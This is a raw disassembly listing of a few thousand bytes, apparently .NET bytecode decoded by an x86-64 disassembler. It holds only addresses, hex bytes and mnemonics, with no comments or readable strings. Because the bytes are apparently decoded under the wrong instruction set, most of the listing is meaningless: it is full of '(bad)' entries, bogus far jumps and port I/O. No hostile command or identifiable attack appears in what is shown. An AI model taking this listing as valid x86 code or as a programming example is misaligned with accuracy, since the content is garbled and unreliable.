  4067aa:	00 5f d2             	add    %bl,-0x2e(%rdi)
  4067ad:	9c                   	pushf
  4067ae:	20 4a 01             	and    %cl,0x1(%rdx)
  4067b1:	00 00                	add    %al,(%rax)
  4067b3:	38 cc                	cmp    %cl,%ah
  4067b5:	cc                   	int3
  4067b6:	ff                   	(bad)
  4067b7:	ff                   	(bad)
  4067b8:	fe 0c 27             	decb   (%rdi,%riz,1)
  4067bb:	00 20                	add    %ah,(%rax)
  4067bd:	08 00                	or     %al,(%rax)
  4067bf:	00 00                	add    %al,(%rax)
  4067c1:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  4067c4:	00 9c 20 04 01 00 00 	add    %bl,0x104(%rax,%riz,1)
  4067cb:	38 ac cc ff ff fe 0c 	cmp    %ch,0xcfeffff(%rsp,%rcx,8)
  4067d2:	27                   	(bad)
  4067d3:	00 20                	add    %ah,(%rax)
  4067d5:	1f                   	(bad)
  4067d6:	00 00                	add    %al,(%rax)
  4067d8:	00 fe                	add    %bh,%dh
  4067da:	0c 2b                	or     $0x2b,%al
  4067dc:	00 9c 20 d2 00 00 00 	add    %bl,0xd2(%rax,%riz,1)
  4067e3:	fe 0e                	decb   (%rsi)
  4067e5:	33 00                	xor    (%rax),%eax
  4067e7:	38 94 cc ff ff fe 0c 	cmp    %dl,0xcfeffff(%rsp,%rcx,8)
  4067ee:	2f                   	(bad)
  4067ef:	00 20                	add    %ah,(%rax)
  4067f1:	0f 00 00             	sldt   (%rax)
  4067f4:	00 fe                	add    %bh,%dh
  4067f6:	0c 1e                	or     $0x1e,%al
  4067f8:	00 9c 20 20 00 00 00 	add    %bl,0x20(%rax,%riz,1)
  4067ff:	38 80 cc ff ff 11    	cmp    %al,0x11ffffcc(%rax)
  406805:	25 1f 0b 11 19       	and    $0x19110b1f,%eax
  40680a:	1b 91 9c 20 76 00    	sbb    0x76209c(%rcx),%edx
  406810:	00 00                	add    %al,(%rax)
  406812:	fe 0e                	decb   (%rsi)
  406814:	33 00                	xor    (%rax),%eax
  406816:	38 ec                	cmp    %ch,%ah
  406818:	03 00                	add    (%rax),%eax
  40681a:	00 39                	add    %bh,(%rcx)
  40681c:	60                   	(bad)
  40681d:	cc                   	int3
  40681e:	ff                   	(bad)
  40681f:	ff                   	(bad)
  406820:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  406823:	00 20                	add    %ah,(%rax)
  406825:	0d 00 00 00 20       	or     $0x20000000,%eax
  40682a:	4d 00 00             	rex.WRB add %r8b,(%r8)
  40682d:	00 20                	add    %ah,(%rax)
  40682f:	27                   	(bad)
  406830:	00 00                	add    %al,(%rax)
  406832:	00 59 9c             	add    %bl,-0x64(%rcx)
  406835:	20 51 00             	and    %dl,0x0(%rcx)
  406838:	00 00                	add    %al,(%rax)
  40683a:	fe 0e                	decb   (%rsi)
  40683c:	33 00                	xor    (%rax),%eax
  40683e:	38 ce                	cmp    %cl,%dh
  406840:	03 00                	add    (%rax),%eax
  406842:	00 3a                	add    %bh,(%rdx)
  406844:	38 cc                	cmp    %cl,%ah
  406846:	ff                   	(bad)
  406847:	ff                   	(bad)
  406848:	fe 0c 27             	decb   (%rdi,%riz,1)
  40684b:	00 20                	add    %ah,(%rax)
  40684d:	1e                   	(bad)
  40684e:	00 00                	add    %al,(%rax)
  406850:	00 20                	add    %ah,(%rax)
  406852:	32 00                	xor    (%rax),%al
  406854:	00 00                	add    %al,(%rax)
  406856:	20 4d 00             	and    %cl,0x0(%rbp)
  406859:	00 00                	add    %al,(%rax)
  40685b:	58                   	pop    %rax
  40685c:	9c                   	pushf
  40685d:	20 a4 01 00 00 38 15 	and    %ah,0x15380000(%rcx,%rax,1)
  406864:	cc                   	int3
  406865:	ff                   	(bad)
  406866:	ff                   	(bad)
  406867:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40686a:	00 20                	add    %ah,(%rax)
  40686c:	00 00                	add    %al,(%rax)
  40686e:	00 00                	add    %al,(%rax)
  406870:	20 9d 00 00 00 20    	and    %bl,0x20000000(%rbp)
  406876:	34 00                	xor    $0x0,%al
  406878:	00 00                	add    %al,(%rax)
  40687a:	59                   	pop    %rcx
  40687b:	9c                   	pushf
  40687c:	20 94 01 00 00 38 f6 	and    %dl,-0x9c80000(%rcx,%rax,1)
  406883:	cb                   	lret
  406884:	ff                   	(bad)
  406885:	ff                   	(bad)
  406886:	38 14 00             	cmp    %dl,(%rax,%rax,1)
  406889:	00 00                	add    %al,(%rax)
  40688b:	7e 08                	jle    0x406895
  40688d:	00 00                	add    %al,(%rax)
  40688f:	04 02                	add    $0x2,%al
  406891:	1a 58 11             	sbb    0x11(%rax),%bl
  406894:	23 38                	and    (%rax),%edi
  406896:	0f 00 00             	sldt   (%rax)
  406899:	00 38                	add    %bh,(%rax)
  40689b:	1e                   	(bad)
  40689c:	00 00                	add    %al,(%rax)
  40689e:	00 38                	add    %bh,(%rax)
  4068a0:	0f 00 00             	sldt   (%rax)
  4068a3:	00 38                	add    %bh,(%rax)
  4068a5:	e2 ff                	loop   0x4068a6
  4068a7:	ff                   	(bad)
  4068a8:	ff 28                	ljmp   *(%rax)
  4068aa:	41 00 00             	add    %al,(%r8)
  4068ad:	06                   	(bad)
  4068ae:	38 e7                	cmp    %ah,%bh
  4068b0:	ff                   	(bad)
  4068b1:	ff                   	(bad)
  4068b2:	ff 28                	ljmp   *(%rax)
  4068b4:	40 00 00             	rex add %al,(%rax)
  4068b7:	06                   	(bad)
  4068b8:	38 e7                	cmp    %ah,%bh
  4068ba:	ff                   	(bad)
  4068bb:	ff                   	(bad)
  4068bc:	ff 13                	call   *(%rbx)
  4068be:	15 dd 0c 00 00       	adc    $0xcdd,%eax
  4068c3:	00 26                	add    %ah,(%rsi)
  4068c5:	dd 00                	fldl   (%rax)
  4068c7:	00 00                	add    %al,(%rax)
  4068c9:	00 72 01             	add    %dh,0x1(%rdx)
  4068cc:	00 00                	add    %al,(%rax)
  4068ce:	70 2a                	jo     0x4068fa
  4068d0:	11 15 2a 28 43 00    	adc    %edx,0x43282a(%rip)        # 0x839100
  4068d6:	00 06                	add    %al,(%rsi)
  4068d8:	38 45 c8             	cmp    %al,-0x38(%rbp)
  4068db:	ff                   	(bad)
  4068dc:	ff 28                	ljmp   *(%rax)
  4068de:	43 00 00             	rex.XB add %al,(%r8)
  4068e1:	06                   	(bad)
  4068e2:	38 9f c8 ff ff 28    	cmp    %bl,0x28ffffc8(%rdi)
  4068e8:	42 00 00             	rex.X add %al,(%rax)
  4068eb:	06                   	(bad)
  4068ec:	38 d5                	cmp    %dl,%ch
  4068ee:	c8 ff ff 28          	enter  $0xffff,$0x28
  4068f2:	2f                   	(bad)
  4068f3:	00 00                	add    %al,(%rax)
  4068f5:	06                   	(bad)
  4068f6:	38 4d c9             	cmp    %cl,-0x37(%rbp)
  4068f9:	ff                   	(bad)
  4068fa:	ff 73 55             	push   0x55(%rbx)
  4068fd:	00 00                	add    %al,(%rax)
  4068ff:	0a 38                	or     (%rax),%bh
  406901:	48 c9                	rex.W leave
  406903:	ff                   	(bad)
  406904:	ff 28                	ljmp   *(%rax)
  406906:	39 00                	cmp    %eax,(%rax)
  406908:	00 06                	add    %al,(%rsi)
  40690a:	38 52 c9             	cmp    %dl,-0x37(%rdx)
  40690d:	ff                   	(bad)
  40690e:	ff 28                	ljmp   *(%rax)
  406910:	43 00 00             	rex.XB add %al,(%r8)
  406913:	06                   	(bad)
  406914:	38 56 c9             	cmp    %dl,-0x37(%rsi)
  406917:	ff                   	(bad)
  406918:	ff 28                	ljmp   *(%rax)
  40691a:	42 00 00             	rex.X add %al,(%rax)
  40691d:	06                   	(bad)
  40691e:	38 2f                	cmp    %ch,(%rdi)
  406920:	ca ff ff             	lret   $0xffff
  406923:	28 42 00             	sub    %al,0x0(%rdx)
  406926:	00 06                	add    %al,(%rsi)
  406928:	38 47 ca             	cmp    %al,-0x36(%rdi)
  40692b:	ff                   	(bad)
  40692c:	ff 28                	ljmp   *(%rax)
  40692e:	30 00                	xor    %al,(%rax)
  406930:	00 06                	add    %al,(%rsi)
  406932:	38 67 ca             	cmp    %ah,-0x36(%rdi)
  406935:	ff                   	(bad)
  406936:	ff 28                	ljmp   *(%rax)
  406938:	32 00                	xor    (%rax),%al
  40693a:	00 06                	add    %al,(%rsi)
  40693c:	38 62 ca             	cmp    %ah,-0x36(%rdx)
  40693f:	ff                   	(bad)
  406940:	ff 28                	ljmp   *(%rax)
  406942:	33 00                	xor    (%rax),%eax
  406944:	00 06                	add    %al,(%rsi)
  406946:	38 5e ca             	cmp    %bl,-0x36(%rsi)
  406949:	ff                   	(bad)
  40694a:	ff 28                	ljmp   *(%rax)
  40694c:	42 00 00             	rex.X add %al,(%rax)
  40694f:	06                   	(bad)
  406950:	38 3d d2 ff ff 28    	cmp    %bh,0x28ffffd2(%rip)        # 0x29406928
  406956:	36 00 00             	ss add %al,(%rax)
  406959:	06                   	(bad)
  40695a:	38 69 d4             	cmp    %ch,-0x2c(%rcx)
  40695d:	ff                   	(bad)
  40695e:	ff 28                	ljmp   *(%rax)
  406960:	37                   	(bad)
  406961:	00 00                	add    %al,(%rax)
  406963:	06                   	(bad)
  406964:	38 64 d4 ff          	cmp    %ah,-0x1(%rsp,%rdx,8)
  406968:	ff 28                	ljmp   *(%rax)
  40696a:	42 00 00             	rex.X add %al,(%rax)
  40696d:	06                   	(bad)
  40696e:	38 a3 d5 ff ff 28    	cmp    %ah,0x28ffffd5(%rbx)
  406974:	3e 00 00             	ds add %al,(%rax)
  406977:	06                   	(bad)
  406978:	38 fc                	cmp    %bh,%ah
  40697a:	d5 ff ff 28          	{rex2 0xff} ud0 (%r24),%r29
  40697e:	42 00 00             	rex.X add %al,(%rax)
  406981:	06                   	(bad)
  406982:	38 53 d6             	cmp    %dl,-0x2a(%rbx)
  406985:	ff                   	(bad)
  406986:	ff 28                	ljmp   *(%rax)
  406988:	34 00                	xor    $0x0,%al
  40698a:	00 06                	add    %al,(%rsi)
  40698c:	38 26                	cmp    %ah,(%rsi)
  40698e:	d7                   	xlat   (%rbx)
  40698f:	ff                   	(bad)
  406990:	ff 28                	ljmp   *(%rax)
  406992:	42 00 00             	rex.X add %al,(%rax)
  406995:	06                   	(bad)
  406996:	38 40 d7             	cmp    %al,-0x29(%rax)
  406999:	ff                   	(bad)
  40699a:	ff 28                	ljmp   *(%rax)
  40699c:	43 00 00             	rex.XB add %al,(%r8)
  40699f:	06                   	(bad)
  4069a0:	38 26                	cmp    %ah,(%rsi)
  4069a2:	d8 ff                	fdivr  %st(7),%st
  4069a4:	ff 28                	ljmp   *(%rax)
  4069a6:	42 00 00             	rex.X add %al,(%rax)
  4069a9:	06                   	(bad)
  4069aa:	38 40 d9             	cmp    %al,-0x27(%rax)
  4069ad:	ff                   	(bad)
  4069ae:	ff 28                	ljmp   *(%rax)
  4069b0:	42 00 00             	rex.X add %al,(%rax)
  4069b3:	06                   	(bad)
  4069b4:	38 6e d9             	cmp    %ch,-0x27(%rsi)
  4069b7:	ff                   	(bad)
  4069b8:	ff 28                	ljmp   *(%rax)
  4069ba:	35 00 00 06 38       	xor    $0x38060000,%eax
  4069bf:	7f db                	jg     0x40699c
  4069c1:	ff                   	(bad)
  4069c2:	ff 28                	ljmp   *(%rax)
  4069c4:	43 00 00             	rex.XB add %al,(%r8)
  4069c7:	06                   	(bad)
  4069c8:	38 c3                	cmp    %al,%bl
  4069ca:	db ff                	(bad)
  4069cc:	ff 28                	ljmp   *(%rax)
  4069ce:	42 00 00             	rex.X add %al,(%rax)
  4069d1:	06                   	(bad)
  4069d2:	38 17                	cmp    %dl,(%rdi)
  4069d4:	dc ff                	fdivr  %st,%st(7)
  4069d6:	ff 28                	ljmp   *(%rax)
  4069d8:	43 00 00             	rex.XB add %al,(%r8)
  4069db:	06                   	(bad)
  4069dc:	38 4c dc ff          	cmp    %cl,-0x1(%rsp,%rbx,8)
  4069e0:	ff 28                	ljmp   *(%rax)
  4069e2:	43 00 00             	rex.XB add %al,(%r8)
  4069e5:	06                   	(bad)
  4069e6:	38 c8                	cmp    %cl,%al
  4069e8:	dc ff                	fdivr  %st,%st(7)
  4069ea:	ff 28                	ljmp   *(%rax)
  4069ec:	43 00 00             	rex.XB add %al,(%r8)
  4069ef:	06                   	(bad)
  4069f0:	38 e0                	cmp    %ah,%al
  4069f2:	dc ff                	fdivr  %st,%st(7)
  4069f4:	ff 28                	ljmp   *(%rax)
  4069f6:	3d 00 00 06 38       	cmp    $0x38060000,%eax
  4069fb:	84 df                	test   %bl,%bh
  4069fd:	ff                   	(bad)
  4069fe:	ff 28                	ljmp   *(%rax)
  406a00:	42 00 00             	rex.X add %al,(%rax)
  406a03:	06                   	(bad)
  406a04:	38 c5                	cmp    %al,%ch
  406a06:	df ff                	(bad)
  406a08:	ff 28                	ljmp   *(%rax)
  406a0a:	30 00                	xor    %al,(%rax)
  406a0c:	00 06                	add    %al,(%rsi)
  406a0e:	38 c7                	cmp    %al,%bh
  406a10:	df ff                	(bad)
  406a12:	ff 28                	ljmp   *(%rax)
  406a14:	31 00                	xor    %eax,(%rax)
  406a16:	00 06                	add    %al,(%rsi)
  406a18:	38 c4                	cmp    %al,%ah
  406a1a:	df ff                	(bad)
  406a1c:	ff 28                	ljmp   *(%rax)
  406a1e:	43 00 00             	rex.XB add %al,(%r8)
  406a21:	06                   	(bad)
  406a22:	38 19                	cmp    %bl,(%rcx)
  406a24:	e0 ff                	loopne 0x406a25
  406a26:	ff 28                	ljmp   *(%rax)
  406a28:	3f                   	(bad)
  406a29:	00 00                	add    %al,(%rax)
  406a2b:	06                   	(bad)
  406a2c:	38 1f                	cmp    %bl,(%rdi)
  406a2e:	e0 ff                	loopne 0x406a2f
  406a30:	ff 28                	ljmp   *(%rax)
  406a32:	42 00 00             	rex.X add %al,(%rax)
  406a35:	06                   	(bad)
  406a36:	38 8b e1 ff ff 73    	cmp    %cl,0x73ffffe1(%rbx)
  406a3c:	31 00                	xor    %eax,(%rax)
  406a3e:	00 0a                	add    %cl,(%rdx)
  406a40:	38 53 e2             	cmp    %dl,-0x1e(%rbx)
  406a43:	ff                   	(bad)
  406a44:	ff 28                	ljmp   *(%rax)
  406a46:	43 00 00             	rex.XB add %al,(%r8)
  406a49:	06                   	(bad)
  406a4a:	38 59 e2             	cmp    %bl,-0x1e(%rcx)
  406a4d:	ff                   	(bad)
  406a4e:	ff 28                	ljmp   *(%rax)
  406a50:	43 00 00             	rex.XB add %al,(%r8)
  406a53:	06                   	(bad)
  406a54:	38 4f e3             	cmp    %cl,-0x1d(%rdi)
  406a57:	ff                   	(bad)
  406a58:	ff 28                	ljmp   *(%rax)
  406a5a:	43 00 00             	rex.XB add %al,(%r8)
  406a5d:	06                   	(bad)
  406a5e:	38 67 e3             	cmp    %ah,-0x1d(%rdi)
  406a61:	ff                   	(bad)
  406a62:	ff 28                	ljmp   *(%rax)
  406a64:	3c 00                	cmp    $0x0,%al
  406a66:	00 06                	add    %al,(%rsi)
  406a68:	38 50 e4             	cmp    %dl,-0x1c(%rax)
  406a6b:	ff                   	(bad)
  406a6c:	ff 28                	ljmp   *(%rax)
  406a6e:	38 00                	cmp    %al,(%rax)
  406a70:	00 06                	add    %al,(%rsi)
  406a72:	38 6d e4             	cmp    %ch,-0x1c(%rbp)
  406a75:	ff                   	(bad)
  406a76:	ff 28                	ljmp   *(%rax)
  406a78:	42 00 00             	rex.X add %al,(%rax)
  406a7b:	06                   	(bad)
  406a7c:	38 a9 e4 ff ff 28    	cmp    %ch,0x28ffffe4(%rcx)
  406a82:	43 00 00             	rex.XB add %al,(%r8)
  406a85:	06                   	(bad)
  406a86:	38 c5                	cmp    %al,%ch
  406a88:	e4 ff                	in     $0xff,%al
  406a8a:	ff 73 32             	push   0x32(%rbx)
  406a8d:	00 00                	add    %al,(%rax)
  406a8f:	0a 38                	or     (%rax),%bh
  406a91:	e7 e4                	out    %eax,$0xe4
  406a93:	ff                   	(bad)
  406a94:	ff 28                	ljmp   *(%rax)
  406a96:	42 00 00             	rex.X add %al,(%rax)
  406a99:	06                   	(bad)
  406a9a:	38 1e                	cmp    %bl,(%rsi)
  406a9c:	e5 ff                	in     $0xff,%eax
  406a9e:	ff 28                	ljmp   *(%rax)
  406aa0:	43 00 00             	rex.XB add %al,(%r8)
  406aa3:	06                   	(bad)
  406aa4:	38 3c e5 ff ff 28 42 	cmp    %bh,0x4228ffff(,%riz,8)
  406aab:	00 00                	add    %al,(%rax)
  406aad:	06                   	(bad)
  406aae:	38 ca                	cmp    %cl,%dl
  406ab0:	e5 ff                	in     $0xff,%eax
  406ab2:	ff 28                	ljmp   *(%rax)
  406ab4:	43 00 00             	rex.XB add %al,(%r8)
  406ab7:	06                   	(bad)
  406ab8:	38 57 e6             	cmp    %dl,-0x1a(%rdi)
  406abb:	ff                   	(bad)
  406abc:	ff 28                	ljmp   *(%rax)
  406abe:	42 00 00             	rex.X add %al,(%rax)
  406ac1:	06                   	(bad)
  406ac2:	38 ce                	cmp    %cl,%dh
  406ac4:	e6 ff                	out    %al,$0xff
  406ac6:	ff 28                	ljmp   *(%rax)
  406ac8:	42 00 00             	rex.X add %al,(%rax)
  406acb:	06                   	(bad)
  406acc:	38 71 e8             	cmp    %dh,-0x18(%rcx)
  406acf:	ff                   	(bad)
  406ad0:	ff 28                	ljmp   *(%rax)
  406ad2:	42 00 00             	rex.X add %al,(%rax)
  406ad5:	06                   	(bad)
  406ad6:	38 75 e9             	cmp    %dh,-0x17(%rbp)
  406ad9:	ff                   	(bad)
  406ada:	ff 28                	ljmp   *(%rax)
  406adc:	43 00 00             	rex.XB add %al,(%r8)
  406adf:	06                   	(bad)
  406ae0:	38 bb e9 ff ff 28    	cmp    %bh,0x28ffffe9(%rbx)
  406ae6:	43 00 00             	rex.XB add %al,(%r8)
  406ae9:	06                   	(bad)
  406aea:	38 01                	cmp    %al,(%rcx)
  406aec:	ea                   	(bad)
  406aed:	ff                   	(bad)
  406aee:	ff 28                	ljmp   *(%rax)
  406af0:	43 00 00             	rex.XB add %al,(%r8)
  406af3:	06                   	(bad)
  406af4:	38 3a                	cmp    %bh,(%rdx)
  406af6:	ea                   	(bad)
  406af7:	ff                   	(bad)
  406af8:	ff 28                	ljmp   *(%rax)
  406afa:	42 00 00             	rex.X add %al,(%rax)
  406afd:	06                   	(bad)
  406afe:	38 50 ea             	cmp    %dl,-0x16(%rax)
  406b01:	ff                   	(bad)
  406b02:	ff 28                	ljmp   *(%rax)
  406b04:	43 00 00             	rex.XB add %al,(%r8)
  406b07:	06                   	(bad)
  406b08:	38 7b ea             	cmp    %bh,-0x16(%rbx)
  406b0b:	ff                   	(bad)
  406b0c:	ff 28                	ljmp   *(%rax)
  406b0e:	42 00 00             	rex.X add %al,(%rax)
  406b11:	06                   	(bad)
  406b12:	38 b1 ea ff ff 28    	cmp    %dh,0x28ffffea(%rcx)
  406b18:	43 00 00             	rex.XB add %al,(%r8)
  406b1b:	06                   	(bad)
  406b1c:	38 d0                	cmp    %dl,%al
  406b1e:	eb ff                	jmp    0x406b1f
  406b20:	ff 28                	ljmp   *(%rax)
  406b22:	42 00 00             	rex.X add %al,(%rax)
  406b25:	06                   	(bad)
  406b26:	38 50 ed             	cmp    %dl,-0x13(%rax)
  406b29:	ff                   	(bad)
  406b2a:	ff 28                	ljmp   *(%rax)
  406b2c:	42 00 00             	rex.X add %al,(%rax)
  406b2f:	06                   	(bad)
  406b30:	38 f4                	cmp    %dh,%ah
  406b32:	ed                   	in     (%dx),%eax
  406b33:	ff                   	(bad)
  406b34:	ff 28                	ljmp   *(%rax)
  406b36:	43 00 00             	rex.XB add %al,(%r8)
  406b39:	06                   	(bad)
  406b3a:	38 db                	cmp    %bl,%bl
  406b3c:	ee                   	out    %al,(%dx)
  406b3d:	ff                   	(bad)
  406b3e:	ff 28                	ljmp   *(%rax)
  406b40:	3b 00                	cmp    (%rax),%eax
  406b42:	00 06                	add    %al,(%rsi)
  406b44:	38 71 ef             	cmp    %dh,-0x11(%rcx)
  406b47:	ff                   	(bad)
  406b48:	ff 28                	ljmp   *(%rax)
  406b4a:	42 00 00             	rex.X add %al,(%rax)
  406b4d:	06                   	(bad)
  406b4e:	38 94 ef ff ff 28 43 	cmp    %dl,0x4328ffff(%rdi,%rbp,8)
  406b55:	00 00                	add    %al,(%rax)
  406b57:	06                   	(bad)
  406b58:	38 f2                	cmp    %dh,%dl
  406b5a:	ef                   	out    %eax,(%dx)
  406b5b:	ff                   	(bad)
  406b5c:	ff 28                	ljmp   *(%rax)
  406b5e:	42 00 00             	rex.X add %al,(%rax)
  406b61:	06                   	(bad)
  406b62:	38 87 f0 ff ff 28    	cmp    %al,0x28fffff0(%rdi)
  406b68:	42 00 00             	rex.X add %al,(%rax)
  406b6b:	06                   	(bad)
  406b6c:	38 bc f1 ff ff 28 42 	cmp    %bh,0x4228ffff(%rcx,%rsi,8)
  406b73:	00 00                	add    %al,(%rax)
  406b75:	06                   	(bad)
  406b76:	38 a2 f2 ff ff 28    	cmp    %ah,0x28fffff2(%rdx)
  406b7c:	43 00 00             	rex.XB add %al,(%r8)
  406b7f:	06                   	(bad)
  406b80:	38 9d f2 ff ff 28    	cmp    %bl,0x28fffff2(%rbp)
  406b86:	42 00 00             	rex.X add %al,(%rax)
  406b89:	06                   	(bad)
  406b8a:	38 c0                	cmp    %al,%al
  406b8c:	f2 ff                	repnz (bad)
  406b8e:	ff 28                	ljmp   *(%rax)
  406b90:	3a 00                	cmp    (%rax),%al
  406b92:	00 06                	add    %al,(%rsi)
  406b94:	38 e4                	cmp    %ah,%ah
  406b96:	f2 ff                	repnz (bad)
  406b98:	ff 28                	ljmp   *(%rax)
  406b9a:	43 00 00             	rex.XB add %al,(%r8)
  406b9d:	06                   	(bad)
  406b9e:	38 3a                	cmp    %bh,(%rdx)
  406ba0:	f3 ff                	repz (bad)
  406ba2:	ff 28                	ljmp   *(%rax)
  406ba4:	42 00 00             	rex.X add %al,(%rax)
  406ba7:	06                   	(bad)
  406ba8:	38 b0 f3 ff ff 28    	cmp    %dh,0x28fffff3(%rax)
  406bae:	42 00 00             	rex.X add %al,(%rax)
  406bb1:	06                   	(bad)
  406bb2:	38 ff                	cmp    %bh,%bh
  406bb4:	f3 ff                	repz (bad)
  406bb6:	ff 28                	ljmp   *(%rax)
  406bb8:	42 00 00             	rex.X add %al,(%rax)
  406bbb:	06                   	(bad)
  406bbc:	38 67 f4             	cmp    %ah,-0xc(%rdi)
  406bbf:	ff                   	(bad)
  406bc0:	ff 28                	ljmp   *(%rax)
  406bc2:	42 00 00             	rex.X add %al,(%rax)
  406bc5:	06                   	(bad)
  406bc6:	38 f5                	cmp    %dh,%ch
  406bc8:	f4                   	hlt
  406bc9:	ff                   	(bad)
  406bca:	ff 28                	ljmp   *(%rax)
  406bcc:	43 00 00             	rex.XB add %al,(%r8)
  406bcf:	06                   	(bad)
  406bd0:	38 41 f6             	cmp    %al,-0xa(%rcx)
  406bd3:	ff                   	(bad)
  406bd4:	ff 28                	ljmp   *(%rax)
  406bd6:	42 00 00             	rex.X add %al,(%rax)
  406bd9:	06                   	(bad)
  406bda:	38 ab f6 ff ff 28    	cmp    %ch,0x28fffff6(%rbx)
  406be0:	3e 00 00             	ds add %al,(%rax)
  406be3:	06                   	(bad)
  406be4:	38 d8                	cmp    %bl,%al
  406be6:	f6 ff                	idiv   %bh
  406be8:	ff 28                	ljmp   *(%rax)
  406bea:	42 00 00             	rex.X add %al,(%rax)
  406bed:	06                   	(bad)
  406bee:	38 15 f9 ff ff 28    	cmp    %dl,0x28fffff9(%rip)        # 0x29406bed
  406bf4:	43 00 00             	rex.XB add %al,(%r8)
  406bf7:	06                   	(bad)
  406bf8:	38 fe                	cmp    %bh,%dh
  406bfa:	f9                   	stc
  406bfb:	ff                   	(bad)
  406bfc:	ff 28                	ljmp   *(%rax)
  406bfe:	43 00 00             	rex.XB add %al,(%r8)
  406c01:	06                   	(bad)
  406c02:	38 8f fa ff ff 28    	cmp    %cl,0x28fffffa(%rdi)
  406c08:	43 00 00             	rex.XB add %al,(%r8)
  406c0b:	06                   	(bad)
  406c0c:	38 0a                	cmp    %cl,(%rdx)
  406c0e:	fc                   	cld
  406c0f:	ff                   	(bad)
  406c10:	ff 28                	ljmp   *(%rax)
  406c12:	42 00 00             	rex.X add %al,(%rax)
  406c15:	06                   	(bad)
  406c16:	38 28                	cmp    %ch,(%rax)
  406c18:	fc                   	cld
  406c19:	ff                   	(bad)
  406c1a:	ff 2a                	ljmp   *(%rdx)
  406c1c:	01 10                	add    %edx,(%rax)
  406c1e:	00 00                	add    %al,(%rax)
  406c20:	00 00                	add    %al,(%rax)
  406c22:	b2 37                	mov    $0x37,%dl
  406c24:	3e f0 37             	ds lock (bad)
  406c27:	06                   	(bad)
  406c28:	0c 00                	or     $0x0,%al
  406c2a:	00 01                	add    %al,(%rcx)
  406c2c:	13 30                	adc    (%rax),%esi
  406c2e:	05 00 26 00 00       	add    $0x2600,%eax
  406c33:	00 08                	add    %cl,(%rax)
  406c35:	00 00                	add    %al,(%rax)
  406c37:	11 2b                	adc    %ebp,(%rbx)
  406c39:	02 26                	add    (%rsi),%ah
  406c3b:	16                   	(bad)
  406c3c:	72 8e                	jb     0x406bcc
  406c3e:	01 00                	add    %eax,(%rax)
  406c40:	70 6f                	jo     0x406cb1
  406c42:	56                   	push   %rsi
  406c43:	00 00                	add    %al,(%rax)
  406c45:	0a 26                	or     (%rsi),%ah
  406c47:	02 28                	add    (%rax),%ch
  406c49:	27                   	(bad)
  406c4a:	00 00                	add    %al,(%rax)
  406c4c:	0a 0a                	or     (%rdx),%cl
  406c4e:	28 57 00             	sub    %dl,0x0(%rdi)
  406c51:	00 0a                	add    %cl,(%rdx)
  406c53:	06                   	(bad)
  406c54:	16                   	(bad)
  406c55:	06                   	(bad)
  406c56:	8e 69 6f             	mov    0x6f(%rcx),%gs
  406c59:	58                   	pop    %rax
  406c5a:	00 00                	add    %al,(%rax)
  406c5c:	0a 2a                	or     (%rdx),%ch
  406c5e:	00 00                	add    %al,(%rax)
  406c60:	1a 2b                	sbb    (%rbx),%ch
  406c62:	02 26                	add    (%rsi),%ah
  406c64:	16                   	(bad)
  406c65:	1b 2a                	sbb    (%rdx),%ebp
  406c67:	00 0b                	add    %cl,(%rbx)
  406c69:	30 02                	xor    %al,(%rdx)
  406c6b:	00 16                	add    %dl,(%rsi)
  406c6d:	00 00                	add    %al,(%rax)
  406c6f:	00 00                	add    %al,(%rax)
  406c71:	00 00                	add    %al,(%rax)
  406c73:	00 2b                	add    %ch,(%rbx)
  406c75:	02 26                	add    (%rsi),%ah
  406c77:	16                   	(bad)
  406c78:	17                   	(bad)
  406c79:	28 4b 00             	sub    %cl,0x0(%rbx)
  406c7c:	00 0a                	add    %cl,(%rdx)
  406c7e:	dd 06                	fldl   (%rsi)
  406c80:	00 00                	add    %al,(%rax)
  406c82:	00 26                	add    %ah,(%rsi)
  406c84:	dd 00                	fldl   (%rax)
  406c86:	00 00                	add    %al,(%rax)
  406c88:	00 2a                	add    %ch,(%rdx)
  406c8a:	00 00                	add    %al,(%rax)
  406c8c:	01 10                	add    %edx,(%rax)
  406c8e:	00 00                	add    %al,(%rax)
  406c90:	00 00                	add    %al,(%rax)
  406c92:	04 00                	add    $0x0,%al
  406c94:	0b 0f                	or     (%rdi),%ecx
  406c96:	00 06                	add    %al,(%rsi)
  406c98:	0c 00                	or     $0x0,%al
  406c9a:	00 01                	add    %al,(%rcx)
  406c9c:	13 30                	adc    (%rax),%esi
  406c9e:	06                   	(bad)
  406c9f:	00 5b 00             	add    %bl,0x0(%rbx)
  406ca2:	00 00                	add    %al,(%rax)
  406ca4:	09 00                	or     %eax,(%rax)
  406ca6:	00 11                	add    %dl,(%rcx)
  406ca8:	2b 02                	sub    (%rdx),%eax
  406caa:	26 16                	es (bad)
  406cac:	d0 50 00             	rclb   $1,0x0(%rax)
  406caf:	00 01                	add    %al,(%rcx)
  406cb1:	28 44 00 00          	sub    %al,0x0(%rax,%rax,1)
  406cb5:	0a 72 c2             	or     -0x3e(%rdx),%dh
  406cb8:	01 00                	add    %eax,(%rax)
  406cba:	70 18                	jo     0x406cd4
  406cbc:	8d 33                	lea    (%rbx),%esi
  406cbe:	00 00                	add    %al,(%rax)
  406cc0:	01 0a                	add    %ecx,(%rdx)
  406cc2:	06                   	(bad)
  406cc3:	16                   	(bad)
  406cc4:	d0 3b                	sarb   $1,(%rbx)
  406cc6:	00 00                	add    %al,(%rax)
  406cc8:	01 28                	add    %ebp,(%rax)
  406cca:	44 00 00             	add    %r8b,(%rax)
  406ccd:	0a a2 06 17 d0 33    	or     0x33d01706(%rdx),%ah
  406cd3:	00 00                	add    %al,(%rax)
  406cd5:	01 28                	add    %ebp,(%rax)
  406cd7:	44 00 00             	add    %r8b,(%rax)
  406cda:	0a a2 06 28 59 00    	or     0x592806(%rdx),%ah
  406ce0:	00 0a                	add    %cl,(%rdx)
  406ce2:	14 18                	adc    $0x18,%al
  406ce4:	8d 0c 00             	lea    (%rax,%rax,1),%ecx
  406ce7:	00 01                	add    %al,(%rcx)
  406ce9:	0b 07                	or     (%rdi),%eax
  406ceb:	16                   	(bad)
  406cec:	02 8c 3b 00 00 01 a2 	add    -0x5dff0000(%rbx,%rdi,1),%cl
  406cf3:	07                   	(bad)
  406cf4:	17                   	(bad)
  406cf5:	03 a2 07 6f 5a 00    	add    0x5a6f07(%rdx),%esp
  406cfb:	00 0a                	add    %cl,(%rdx)
  406cfd:	74 38                	je     0x406d37
  406cff:	00 00                	add    %al,(%rax)
  406d01:	01 2a                	add    %ebp,(%rdx)
  406d03:	00 1b                	add    %bl,(%rbx)
